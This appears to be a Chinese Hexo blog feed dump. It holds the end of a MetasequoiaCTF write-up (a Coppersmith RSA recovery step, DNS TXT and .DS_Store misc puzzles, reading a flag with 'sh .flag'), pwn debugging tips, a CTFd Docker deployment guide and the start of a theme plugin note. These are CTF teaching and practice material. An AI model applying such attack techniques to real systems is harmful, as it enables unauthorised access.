class="number">0x1f6f6a8e61f7b5ad8bef738f4376a96724192d8da1e3689dec7ce5d1df615e0910803317f9bafb6671ffe722e0292ce76cca399f2af1952dd31a61b37019da9cf27f82c3ecd4befc03c557efe1a5a29f9bb73c0239f62ed951955718ac0eaa3f60a4c415ef064ea33bbd61abe127c6fc808c0edb034c52c45bd20a219317fb75</span></span><br><span class="line"><span class="comment">#print "upper %d bits (of %d bits) is given" % (nbits - kbits, nbits)</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x) ^ e - c</span><br><span class="line">m</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span> ^ kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n1</span></span><br><span class="line">mbar + x0</span><br></pre></td></tr></table></figure></div><p>解得:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xb11ffc4ce423c77035280f1c575696327901daac8a83c057c453973ee5f4e508455648886441c0f3393fe4c922ef1c3a6249c12d21a4a8c1d4dec4a0e9bf1</span><br></pre></td></tr></table></figure></div><p>则对比原来的16进制发现flag为<code>flag{4a8c1d4dec4a0e9bf1}</code>。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>有一到题解出了密文，但是没看出来是base32加密，最后与flag无缘…misc真是太杂了…</p><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><ul><li><p>题目描述：</p><blockquote><p>欢迎来到MetasequoiaCTF！请扫描二维码完成比赛签到。<br>By <em>FLAG挖掘机</em></p></blockquote></li><li><p>考察点：ps</p></li><li><p>难度：入门</p></li><li><p>初始分值：100</p></li><li><p>最终分值：20</p></li><li><p>完成人数：37</p></li></ul><p>给的二维码扫不了</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/misc/checkin/%E4%B8%8D%E6%98%AF%E4%BA%8C%E7%BB%B4%E7%A0%81.png" data-fancybox="group" data-caption="不是二维码.png" class="fancybox"><img alt="不是二维码.png" title="不是二维码.png" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/misc/checkin/%E4%B8%8D%E6%98%AF%E4%BA%8C%E7%BB%B4%E7%A0%81.png" src="/img/loading.gif" class="lazyload"></a></p><p>用ps去掉绿色干扰部分，扫码即可</p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/misc/checkin/qr-de.png" data-fancybox="group" data-caption="qrd" class="fancybox"><img alt="qrd" style="zoom:38%;" title="qrd" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/misc/checkin/qr-de.png" src="/img/loading.gif" class="lazyload"></a><h2 id="Rabbit-Hole"><a href="#Rabbit-Hole" class="headerlink" title="Rabbit Hole"></a>Rabbit Hole</h2><ul><li><p>题目描述：</p><blockquote><p>一只奇怪的兔子钻进洞里啦，赶紧把它揪出来。 </p><p><a href="http://rabbit.yoshino-s.org/" target="_blank" rel="noopener">http://rabbit.yoshino-s.org/</a> </p><p>By <em>Yoshino-s</em></p></blockquote></li><li><p>考察点：dig命令、rabbit加密</p></li><li><p>难度：简单</p></li><li><p>初始分值：100</p></li><li><p>最终分值：62</p></li><li><p>完成人数：9</p></li></ul><p>访问网页，得到提示：</p><blockquote><p>To catch the rabbit, you should dig deeper and find the txt.</p></blockquote><p>用dig命令查询这个题目url的TXT记录：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> dig -t TXT rabbit.yoshino-s.org</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P1-1ubuntu2.6-Ubuntu &lt;&lt;&gt;&gt; -t TXT rabbit.yoshino-s.org</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 54090</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;rabbit.yoshino-s.org.INTXT</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">rabbit.yoshino-s.org.300INTXT"U2FsdGVkX18BkpB/W9lD7ZGSP5BprjbrL/WKn+7fn8gWCXpmDW+y/5FoVYPd5pIFCZfHFiov"</span><br><span class="line"></span><br><span class="line">;; Query time: 192 msec</span><br><span class="line">;; SERVER: 127.0.0.53#53(127.0.0.53)</span><br><span class="line">;; WHEN: 四 2月 20 20:30:40 CST 2020</span><br><span class="line">;; MSG SIZE  rcvd: 134</span><br></pre></td></tr></table></figure></div><p>在<code>ANSWER SECTION:</code>中得到密文，<a href="https://www.sojson.com/encrypt_rabbit.html" target="_blank" rel="noopener">Rabbit解密</a>后即为flag</p><blockquote><p>flag{0d23348ede942398962778bf49c59776}</p></blockquote><h2 id="Dont-use-Mac-unsolved"><a href="#Dont-use-Mac-unsolved" class="headerlink" title="Dont use Mac [unsolved]"></a>Dont use Mac [unsolved]</h2><ul><li><p>题目描述：</p><blockquote><p>解答本题时请不要使用Mac。<br>By <em>FLAG挖掘机</em><br>hint: Plz, check everything you’ve got.    </p></blockquote></li><li><p><a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Misc/Don' target=" _blank" rel="noopener" tusemac attachment.zip">题目附件</a></p></li><li><p>考察点：.DS_Store信息泄漏</p></li><li><p>难度：简单</p></li><li><p>初始分值：200</p></li><li><p>最终分值：170</p></li><li><p>完成人数：6</p></li></ul><blockquote><p>比赛的时候没有解出来，后来看了官方wp，其实就差一点点儿了</p><p>还是自己对各种常见加密不够敏感…wtcl</p></blockquote><h3 id="官方wp-2"><a href="#官方wp-2" class="headerlink" title="官方wp"></a>官方wp</h3><p>解压缩包发现有一个文件夹和一张图片，图片里藏了压缩包，但实际上这里是误区，真正的flag是藏在<code>__MACOSX</code>文件夹下，这个文件夹通常是在解压缩的时候会存在，<code>__MACOSX</code> 中的<code>.DS_Store</code>里存在可疑字符串,通过Base32+ROT13即可得到答案。这里要注意的是，Mac上在解压缩的时候会在建立文件夹的时候覆盖掉<code>.DS_Store</code>，这也是题目名字的暗示。</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>查找字符串：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rabin2 -zz ./__MACOSX/.DS_Store </span></span><br><span class="line">[Strings]</span><br><span class="line">nth paddr      vaddr      len size section type    string</span><br><span class="line">―――――――――――――――――――――――――――――――――――――――――――――――――――――――――</span><br><span class="line">0   0x00000004 0x00000004 4   5            ascii   Bud1</span><br><span class="line">1   0x00000060 0x00000060 4   5            ascii   bwsp</span><br><span class="line">2   0x00000070 0x00000070 32  33           ascii   ON4W45D3OEYGCR27KBSTI4CYL5NHE7I=</span><br><span class="line">3   0x0000020f 0x0000020f 8   17           utf16le \b__MACOS</span><br><span class="line">4   0x00000220 0x00000220 8   9            ascii   bwspblob</span><br><span class="line">5   0x0000022c 0x0000022c 8   9            ascii   bplist00</span><br><span class="line">6   0x0000023b 0x0000023b 59  60           ascii   \a\b\b\n\b\n\r\n]ShowStatusBar[ShowPathbar[ShowToolbar[ShowTabView_</span><br><span class="line">7   0x00000278 0x00000278 51  52           ascii   </span><br><span class="line">8   0x000002ad 0x000002ad 26  27           ascii   &#123;&#123;370, 215&#125;, &#123;770, 436&#125;&#125;\t\b</span><br><span class="line">9   0x000002c8 0x000002c8 12  13           ascii   %1=I`myz&#123;|&#125;~</span><br><span class="line">10  0x000002f8 0x000002f8 8   17           utf16le \b__MACOS</span><br><span class="line">11  0x00000309 0x00000309 8   9            ascii   lg1Scomp</span><br><span class="line">12  0x0000031c 0x0000031c 8   17           utf16le \b__MACOS</span><br><span class="line">13  0x0000032d 0x0000032d 8   9            ascii   moDDblob</span><br><span class="line">14  0x00000348 0x00000348 6   13           utf16le _MACOS</span><br><span class="line">15  0x00000355 0x00000355 8   9            ascii   modDblob</span><br><span class="line">16  0x00000370 0x00000370 6   13           utf16le _MACOS</span><br><span class="line">17  0x0000037d 0x0000037d 8   9            ascii   ph1Scomp</span><br><span class="line">18  0x00000390 0x00000390 8   17           utf16le \b__MACOS</span><br><span class="line">19  0x000003a1 0x000003a1 8   9            ascii   vSrnlong</span><br><span class="line">20  0x00001411 0x00001411 4   5            ascii   DSDB</span><br></pre></td></tr></table></figure></div><p>得到字符串：</p><blockquote><p>ON4W45D3OEYGCR27KBSTI4CYL5NHE7I=</p></blockquote><p>解密：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/misc/Dont%20Use%20Mac/mac.png" data-fancybox="group" data-caption="mac.png" class="fancybox"><img alt="mac.png" title="mac.png" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/misc/Dont%20Use%20Mac/mac.png" src="/img/loading.gif" class="lazyload"></a></p><h2 id="rm-rf"><a href="#rm-rf" class="headerlink" title="rm -rf /"></a>rm -rf /</h2><ul><li><p>题目描述：</p><blockquote><p>出题人不会出题，只好把系统命令删了让大家来猜flag。<br>注：请使用<code>nc</code>连接容器，浏览器访问是无效的。<br>By <em>FLAG挖掘机</em>                     </p></blockquote></li><li><p>考察点：linux命令、shell编程</p></li><li><p>难度：简单</p></li><li><p>初始分值：250</p></li><li><p>最终分值：244</p></li><li><p>完成人数：3</p></li></ul><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p><code>nc</code>连过去，有一次执行命令的机会，直接执行sh即可拿到shell</p><p>看了下<code>/bin</code>目录下的文件，删除了有输出功能的<code>cat</code>、<code>grep</code>等命令，不过<code>sh</code>还在，只要<code>sh .flag</code>，就能从<code>stderr</code>中读到flag</p><blockquote><p>sh 会逐条执行文本中的命令，命令不存在时会报错 e.g.</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sh txt </span></span><br><span class="line">txt: 1: txt: xxxx: not found</span><br></pre></td></tr></table></figure></div></blockquote><h3 id="官方解"><a href="#官方解" class="headerlink" title="官方解"></a>官方解</h3><p>出题人背锅的一道题，存在很多非预期解。</p><p>预期解法是</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while read -r line;do echo $line;done&lt;/.flag</span><br></pre></td></tr></table></figure></div><p>但实际做下来发现，因为没有对输入进行限制，<code>sed</code>等命令就可以读到flag。删去的命令基本上是<code>cat, grep, head,more, tail, less, base64</code>等，其实还删去了<code>/usr/bin/</code>下的内容。</p><h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>出题师傅们十分用心，<a href="https://github.com/SignorMercurio/MetasequoiaCTF" target="_blank" rel="noopener">官方wp</a>讲解的超级详细，体验很好的一次CTF比赛~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> double free </tag>
            
            <tag> dig </tag>
            
            <tag> rabbit </tag>
            
            <tag> 二维码 </tag>
            
            <tag> RSA </tag>
            
            <tag> RSA共模攻击 </tag>
            
            <tag> smali </tag>
            
            <tag> fastbin </tag>
            
            <tag> nop sled </tag>
            
            <tag> 无符号整数 </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn小技巧总结</title>
      <link href="/2020/02/19/pwn-technique/"/>
      <url>/2020/02/19/pwn-technique/</url>
      
        <content type="html"><![CDATA[<h1 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h1><h2 id="调试指定进程"><a href="#调试指定进程" class="headerlink" title="调试指定进程"></a>调试指定进程</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gdb attach &lt;pid&gt;</span></span><br></pre></td></tr></table></figure></div><p>若失败，可能是权限不够，试试用<code>sudo</code></p><h2 id="PIE下断点"><a href="#PIE下断点" class="headerlink" title="PIE下断点"></a>PIE下断点</h2><p>调试开启PIE保护的程序时，下断点可以使用<code>$rebase</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b *<span class="variable">$rebase</span>(0xAAAA)</span></span><br></pre></td></tr></table></figure></div><h2 id="Pwntools-gdb执行多条指令"><a href="#Pwntools-gdb执行多条指令" class="headerlink" title="Pwntools.gdb执行多条指令"></a>Pwntools.gdb执行多条指令</h2><p>若想执行多条指令，可以使用<code>\n</code>连接多条指令：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(p, <span class="string">"b *$rebase(0xAAAA)\n"</span> + <span class="string">"c\n"</span> + <span class="string">"si"</span>)</span><br></pre></td></tr></table></figure></div><h2 id="pwngdb-堆相关指令"><a href="#pwngdb-堆相关指令" class="headerlink" title="pwngdb 堆相关指令"></a>pwngdb 堆相关指令</h2><p>查看堆结构 <a href="https://github.com/SignorMercurio/MetasequoiaCTF/tree/master/Pwn/Summoner" target="_blank" rel="noopener">Ref.</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> heapls</span></span><br><span class="line">           ADDR             SIZE            STATUS</span><br><span class="line">sbrk_base  0x56476bb24000</span><br><span class="line">chunk      0x56476bb24000   0x1010          (inuse)</span><br><span class="line">chunk      0x56476bb25010   0x20            (inuse)</span><br><span class="line">chunk      0x56476bb25030   0x20            (inuse)</span><br><span class="line">chunk      0x56476bb25050   0x20fb0         (top)</span><br><span class="line">sbrk_end   0x56476bb46000</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/8gx 0x56476bb25010</span></span><br><span class="line">0x56476bb25010:0x00000000000000000x0000000000000021</span><br><span class="line">0x56476bb25020:0x000056476bb250400x0000000000000000</span><br><span class="line">0x56476bb25030:0x00000000000000000x0000000000000021</span><br><span class="line">0x56476bb25040:0x61616161616161610x0000000000000005</span><br></pre></td></tr></table></figure></div><p>相关指令</p><blockquote><p>heap (查看堆详细内容) </p><p>bins  (查看bins)</p></blockquote><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><h2 id="求余数运算反汇编"><a href="#求余数运算反汇编" class="headerlink" title="求余数运算反汇编"></a>求余数运算反汇编</h2><p>求余运算F5反汇编结果如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v5 = <span class="number">3</span> * v0 - <span class="number">0X30</span> * ((<span class="keyword">unsigned</span> __int64)(<span class="number">0xAAAAAAAAAAAAAAAB</span>LL * (<span class="keyword">unsigned</span> __int128)(<span class="number">3</span> * v0) &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">5</span>);</span><br></pre></td></tr></table></figure></div><p>其实相当于如下运算：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v5 = <span class="number">3</span> * v0 % <span class="number">0x30</span>;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> pwn总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> GDB </tag>
            
            <tag> PIE </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFd一键部署Pwn题目动态靶机</title>
      <link href="/2020/02/18/pwn-docker/"/>
      <url>/2020/02/18/pwn-docker/</url>
      
        <content type="html"><![CDATA[<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>安装赵师傅写的动态靶机插件<a href="https://www.zhaoj.in/read-6333.html" target="_blank" rel="noopener">CTFd-Whale</a></p><p>下载部署环境：<code>git clone https://github.com/TaQini/pwn_docker.git</code></p><h1 id="一键部署"><a href="#一键部署" class="headerlink" title="一键部署"></a>一键部署</h1><p><code>pwn-docker</code>是我写的一个用于自动生成pwn题目docker镜像的脚本，功能如下：</p><ul><li><p>使用ctf_xinetd控制权限</p></li><li><p>动态靶机环境+动态flag（由CTFd-whale生成）</p></li><li><p>无需修改配置，一键生成镜像</p></li></ul><h2 id="生成docker镜像"><a href="#生成docker镜像" class="headerlink" title="生成docker镜像"></a>生成docker镜像</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./deploy.py your_pwn_challenge docker_REPOSITORY_name</span></span><br></pre></td></tr></table></figure></div><blockquote><p>your_pwn_challenge: ELF类型的题目文件</p><p>docker_REPOSITORY_name: Docker镜像名(只允许小写)</p></blockquote><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><blockquote><p>题目位置：/home/TaQini/pwn/mm1/Memory_Monster_I</p><p>镜像名：mm1</p></blockquote><p>一键生成镜像：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./deploy.py /home/TaQini/pwn/mm1/Memory_Monster_I mm1</span></span><br></pre></td></tr></table></figure></div><p>查看生成的镜像：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo docker images</span></span><br><span class="line">REPOSITORY      TAG          IMAGE ID            CREATED               SIZE</span><br><span class="line">mm1             latest       5a10fb53596b        30 seconds ago        378MB</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div><h2 id="部署到CTFd平台"><a href="#部署到CTFd平台" class="headerlink" title="部署到CTFd平台"></a>部署到CTFd平台</h2><p>新建题目，选择题目类型为<code>dynamic_docker</code>，并进行如下配置：</p><blockquote><p>Docker Image: 刚刚生成的镜像名</p><p>Frp Redirect Type: Direct</p><p>Frp Redirect Port: 9999</p></blockquote><h3 id="栗子-1"><a href="#栗子-1" class="headerlink" title="栗子"></a>栗子</h3><p>新建题目，选择题目类型为<code>dynamic_docker</code>：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200218162214.png" data-fancybox="group" data-caption="new" class="fancybox"><img alt="new" title="new" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200218162214.png" src="/img/loading.gif" class="lazyload"></a></p><p>进行如下配置：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200218162443.png" data-fancybox="group" data-caption="config" class="fancybox"><img alt="config" title="config" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200218162443.png" src="/img/loading.gif" class="lazyload"></a></p><p>更新题目，查看效果：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200218162949.png" data-fancybox="group" data-caption="show" class="fancybox"><img alt="show" title="show" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200218162949.png" src="/img/loading.gif" class="lazyload"></a></p><p>测试flag：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200218163941.png" data-fancybox="group" data-caption="flag" class="fancybox"><img alt="flag" title="flag" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200218163941.png" src="/img/loading.gif" class="lazyload"></a></p><h1 id="CTFq"><a href="#CTFq" class="headerlink" title="CTFq"></a>CTFq</h1><div class="note success">            <blockquote><p><a href="http://47.100.63.152:8000/" target="_blank" rel="noopener">CTFq平台</a>题目将不定期更新，欢迎师傅们前来练习~</p></blockquote>          </div>]]></content>
      
      
      <categories>
          
          <category> CTFd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CTFd </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo Butterfly 主题功能拓展</title>
      <link href="/2020/02/18/Hexo-theme-extension/"/>
      <url>/2020/02/18/Hexo-theme-extension/</url>
      
        <content type="html"><![CDATA[<p>记录一下正在使用的两款Hexo插件</p><h1 id="Hexo-Tag-Cloud"><a href="#Hexo-Tag-Cloud" class="headerlink" title="Hexo-Tag-Cloud"></a>Hexo-Tag-Cloud</h1><p>Hexo 标签云插件：<a href="https://github.com/MikeCoder/hexo-tag-cloud/blob/master/README.ZH.md" target="_blank" rel="noopener">官方文档</a></p><h2 id="安装流程"><a href="#安装流程" class="headerlink" title="安装流程"></a>安装流程</h2><ol><li>进入到 hexo 的根目录，然后在 <code>package.json</code> 中添加依赖: <code>&quot;hexo-tag-cloud&quot;: &quot;2.1.*&quot;</code></li><li>执行 <code>npm install</code> 命令</li><li>修改主题模板（详见下）</li><li>配置_config.yml（详见下）</li></ol><h2 id="修改-tagcloud-的模板"><a href="#修改-tagcloud-的模板" class="headerlink" title="修改 tagcloud 的模板"></a>修改 tagcloud 的模板</h2><p>我使用的是Butterfly，对应的模板是pug格式的，官方文档中原先是没有pug的文档，我折腾了一下给移植过去了（pug貌似就是html语言的简化）：</p><p>首先找到 <code>Butterfly/layout/includes/widget/card_tags.pug</code> 文件</p><p>将这个文件修改为如下内容(注意缩进):</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if site.tags.length</span><br><span class="line">  .card-widget.card-tags</span><br><span class="line">    .card-content</span><br><span class="line">      .item-headline</span><br><span class="line">        i.fa.fa-tags(aria-hidden&#x3D;&quot;true&quot;)</span><br><span class="line">        span&#x3D; _p(&#39;aside.card_tags&#39;)</span><br><span class="line">        script(type&#x3D;&quot;text&#x2F;javascript&quot; charset&#x3D;&quot;utf-8&quot; src&#x3D;&quot;&#x2F;js&#x2F;tagcloud.js&quot;)</span><br><span class="line">        script(type&#x3D;&quot;text&#x2F;javascript&quot; charset&#x3D;&quot;utf-8&quot; src&#x3D;&quot;&#x2F;js&#x2F;tagcanvas.js&quot;)</span><br><span class="line">        #myCanvasContainer.widget.tagcloud(align&#x3D;&#39;center&#39;, style&#x3D;&#39;width&#x3D;100%;height&#x3D;100%;margin:0;padding:0&#39;)</span><br><span class="line">          canvas#resCanvas(width&#x3D;200,style&#x3D;&#39;width&#x3D;100%;height&#x3D;100%;margin:0;padding:0;display:block&#39;)</span><br><span class="line">            !&#x3D; tagcloud()</span><br><span class="line">          br</span><br><span class="line">          !&#x3D; tagcloud(&#123;min_font: 16, max_font: 24, amount: 50, color: true, start_color: &#39;#0D0E0F&#39;, end_color: &#39;#99a9bf&#39;&#125;)</span><br></pre></td></tr></table></figure></div><blockquote><p> 其中<code>resCanvas</code>的参数可以设置，<code>tagcloud</code>的字体大小颜色等参数也可以设置</p></blockquote><h2 id="配置-config-yml"><a href="#配置-config-yml" class="headerlink" title="配置_config.yml"></a>配置_config.yml</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hexo-tag-cloud</span></span><br><span class="line"><span class="attr">tag_cloud:</span></span><br><span class="line">    <span class="attr">textFont:</span> <span class="string">Microsoft</span> <span class="string">YaHei,</span> <span class="string">monospace</span></span><br><span class="line">    <span class="attr">textColor:</span> <span class="string">'#323'</span></span><br><span class="line">    <span class="attr">textHeight:</span> <span class="number">18</span></span><br><span class="line">    <span class="attr">outlineColor:</span> <span class="string">'#E2E1D1'</span> <span class="comment"># '#B5B4AA' '#E2E1D1'</span></span><br><span class="line">    <span class="attr">maxSpeed:</span> <span class="number">0.2</span></span><br></pre></td></tr></table></figure></div><h1 id="Hexo-Helper-Live2d"><a href="#Hexo-Helper-Live2d" class="headerlink" title="Hexo-Helper-Live2d"></a>Hexo-Helper-Live2d</h1><p>向你的Hexo里放上一只萌萌哒二次元看板娘!（看板娘居多，不过也有小猫小狗。。。）</p><p><a href="https://github.com/EYHN/hexo-helper-live2d/blob/master/README.zh-CN.md" target="_blank" rel="noopener">官方文档</a> </p><h2 id="安装流程-1"><a href="#安装流程-1" class="headerlink" 